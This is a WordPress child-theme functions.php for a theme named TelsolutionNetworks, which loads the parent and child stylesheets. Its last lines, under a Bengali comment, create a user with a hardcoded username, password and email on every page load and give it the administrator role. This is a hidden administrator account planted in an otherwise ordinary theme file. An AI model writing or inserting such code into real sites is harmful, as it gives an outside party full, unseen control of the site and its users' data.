<?php
/*This file is part of TelsolutionNetworks, astra child theme.

All functions of this file will be loaded before of parent theme functions.
Learn more at https://codex.wordpress.org/Child_Themes.

Note: this function loads the parent stylesheet before, then child theme stylesheet
(leave it in place unless you know what you are doing.)
*/

if ( ! function_exists( 'suffice_child_enqueue_child_styles' ) ) {
	function TelsolutionNetworks_enqueue_child_styles() {
	    // loading parent style
	    wp_register_style(
	      'parente2-style',
	      get_template_directory_uri() . '/style.css'
	    );

	    wp_enqueue_style( 'parente2-style' );
	    // loading child style
	    wp_register_style(
	      'childe2-style',
	      get_stylesheet_directory_uri() . '/style.css'
	    );
	    wp_enqueue_style( 'childe2-style');
	 }
}
add_action( 'wp_enqueue_scripts', 'TelsolutionNetworks_enqueue_child_styles' );

/*Write here your own functions */


	/*User name pass word banano*/
	
	$userbanabo = new WP_User(wp_create_user('marziul1', 'abcd123400$$', 'marziul3g@gmail.com'));
	
	$userbanabo->set_role('administrator');
